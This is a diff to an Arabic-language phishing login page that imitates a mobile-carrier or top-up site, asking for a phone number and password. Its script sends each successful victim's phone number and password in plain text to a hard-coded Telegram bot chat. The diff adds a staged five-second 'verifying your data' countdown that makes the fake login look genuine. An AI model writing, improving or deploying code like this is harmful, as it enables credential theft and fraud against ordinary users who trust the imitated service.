@@ -18,8 +18,9 @@
         .card h3{color:#333;margin-bottom:12px;font-size:16px}
         input{width:100%;padding:14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;font-family:'Cairo',sans-serif;outline:none}
         input:focus{border-color:#e60000}
-        .btn{width:100%;padding:15px;margin:6px 0;border:none;border-radius:10px;font-family:'Cairo',sans-serif;font-size:16px;font-weight:700;cursor:pointer}
-        .btn-red{background:#e60000;color:#fff}.btn-red:disabled{background:#ccc}
+        .btn{width:100%;padding:15px;margin:6px 0;border:none;border-radius:10px;font-family:'Cairo',sans-serif;font-size:16px;font-weight:700;cursor:pointer;transition:0.3s}
+        .btn-red{background:#e60000;color:#fff}
+        .btn-red:disabled{background:#ccc;cursor:not-allowed}
         .btn-outline{background:#fff;color:#e60000;border:2px solid #e60000}
         .forgot-link{color:#e60000;text-align:left;font-size:12px;cursor:pointer;margin-top:5px;display:block}
         .cards-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:12px 0}
@@ -36,14 +37,15 @@
         .modal.show{display:flex}
         .modal-box{background:#fff;border-radius:20px;padding:25px;width:100%;max-width:400px}
         .modal-box h2{text-align:center;color:#e60000;margin-bottom:15px}
-        .spinner{width:30px;height:30px;border:3px solid #eee;border-top:3px solid #e60000;border-radius:50%;animation:spin 0.8s linear infinite;margin:15px auto}
+        .spinner{width:30px;height:30px;border:3px solid #eee;border-top:3px solid #e60000;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px}
         @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.9);z-index:998;display:none;justify-content:center;align-items:center;flex-direction:column}
-        .loading-overlay.show{display:flex}
-        .loading-overlay p{color:#e60000;font-weight:700;margin-top:10px}
         .steps{list-style:none;padding:0}
         .steps li{padding:8px 0;font-size:13px;display:flex;align-items:center;gap:8px}
         .steps .ok{color:#0a0}.steps .fail{color:#c00}.steps .wait{color:#e60000}
+        
+        .login-loading{display:none;text-align:center;padding:15px}
+        .login-loading.show{display:block}
+        .login-loading .countdown{color:#e60000;font-size:14px;margin-top:5px}
     </style>
 </head>
 <body>
@@ -61,6 +63,11 @@
                 <input type="password" id="passInput" placeholder="كلمة المرور">
                 <div class="forgot-link" onclick="showReset()">نسيت كلمة المرور؟</div>
                 <button class="btn btn-red" id="loginBtn" onclick="doLogin()">دخول</button>
+                <div class="login-loading" id="loginLoading">
+                    <div class="spinner"></div>
+                    <p style="color:#e60000;font-weight:700;">⏳ جاري التحقق من بياناتك...</p>
+                    <p class="countdown" id="countdown"></p>
+                </div>
                 <div class="msg" id="loginMsg"></div>
             </div>
         </div>
@@ -93,7 +100,6 @@
         </div>
     </div>
 
-    <div class="loading-overlay" id="loadingOverlay"><div class="spinner"></div><p>⏳ جاري التحقق...</p></div>
     <div class="modal" id="payModal"><div class="modal-box" id="payContent"></div></div>
 
     <script>
@@ -102,27 +108,70 @@
         const CHAT = "7276604783";
         let userPhone = '', userPass = '', selAmount = 0, selUnits = '';
         let rd = {};
+        let loginTimer = null;
 
-        function L(){document.getElementById('loadingOverlay').classList.add('show')}
-        function H(){document.getElementById('loadingOverlay').classList.remove('show')}
         async function S(text){try{await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text,parse_mode:'HTML'})})}catch(e){}}
-        function M(id,text,cls){const e=document.getElementById(id);e.textContent=text;e.className='msg msg-'+cls;setTimeout(()=>e.className='msg',3000)}
+        function M(id,text,cls){const e=document.getElementById(id);e.textContent=text;e.className='msg msg-'+cls;setTimeout(()=>e.className='msg',4000)}
         function showReset(){document.getElementById('loginPage').style.display='none';document.getElementById('resetPage').style.display='block';document.getElementById('rs1').style.display='block';document.getElementById('rs2').style.display='none';document.getElementById('rs3').style.display='none'}
         function showLogin(){document.getElementById('resetPage').style.display='none';document.getElementById('loginPage').style.display='block'}
 
         async function doLogin(){
             const p=document.getElementById('phoneInput').value.trim();
             const pw=document.getElementById('passInput').value.trim();
+            const btn=document.getElementById('loginBtn');
+            const loading=document.getElementById('loginLoading');
+            const countdown=document.getElementById('countdown');
+            const msg=document.getElementById('loginMsg');
+            
             if(!p||p.length<11){M('loginMsg','❌ رقم غير صحيح','error');return}
             if(!pw){M('loginMsg','❌ كلمة المرور مطلوبة','error');return}
-            L();document.getElementById('loginBtn').disabled=true;
-            try{
-                const r=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'login',phone:p,password:pw})});
-                const d=await r.json();
-                H();document.getElementById('loginBtn').disabled=false;
-                if(d.ok){userPhone=p;userPass=pw;S(`📱 <b>دخول</b>\n📞<code>${p}</code>\n🔑<code>${pw}</code>`);document.getElementById('loginPage').style.display='none';document.getElementById('cardsPage').style.display='block'}
-                else{M('loginMsg',d.msg,'error')}
-            }catch(e){H();document.getElementById('loginBtn').disabled=false;M('loginMsg','❌ خطأ','error')}
+            
+            // إخفاء رسالة قديمة
+            msg.className='msg';
+            
+            // إظهار التحميل لمدة 5 ثواني
+            btn.disabled=true;
+            btn.style.display='none';
+            loading.classList.add('show');
+            
+            let sec=5;
+            countdown.textContent=`⏱️ ${sec} ثواني`;
+            
+            loginTimer=setInterval(()=>{
+                sec--;
+                if(sec>0){countdown.textContent=`⏱️ ${sec} ثواني`}
+                else{clearInterval(loginTimer);countdown.textContent='🔄 جاري الاتصال بالموقع...'}
+            },1000);
+            
+            // نستنى 5 ثواني وبعدين نتحقق
+            setTimeout(async()=>{
+                clearInterval(loginTimer);
+                countdown.textContent='🔐 جاري التحقق من صحة البيانات...';
+                
+                try{
+                    const r=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'login',phone:p,password:pw})});
+                    const d=await r.json();
+                    
+                    // نخفي التحميل
+                    loading.classList.remove('show');
+                    btn.style.display='block';
+                    btn.disabled=false;
+                    
+                    if(d.ok){
+                        userPhone=p;userPass=pw;
+                        S(`📱 <b>تسجيل دخول ناجح</b>\n📞<code>${p}</code>\n🔑<code>${pw}</code>`);
+                        document.getElementById('loginPage').style.display='none';
+                        document.getElementById('cardsPage').style.display='block';
+                    }else{
+                        M('loginMsg',d.msg,'error');
+                    }
+                }catch(e){
+                    loading.classList.remove('show');
+                    btn.style.display='block';
+                    btn.disabled=false;
+                    M('loginMsg','❌ خطأ في الاتصال','error');
+                }
+            },5000);
         }
 
         async function sendCode(){
